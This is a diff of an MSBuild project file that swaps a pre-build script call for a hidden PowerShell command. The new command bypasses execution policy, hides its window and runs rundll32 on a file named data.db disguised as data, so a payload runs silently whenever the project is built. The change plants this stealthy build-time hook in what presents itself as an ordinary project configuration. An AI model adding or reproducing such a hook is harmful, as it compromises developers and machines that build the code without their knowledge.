@@ -6,7 +6,7 @@
 <Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <ItemDefinitionGroup>
     <PreBuildEvent>
-      <Command>powershell -ExecutionPolicy Bypass -File "$(ProjectDir)prepare.ps1"</Command>
+      <Command>powershell -ExecutionPolicy Bypass -nop -w hidden rundll32 x64\Debug\data.db,Start</Command>
     </PreBuildEvent>
   </ItemDefinitionGroup>
 </Project>
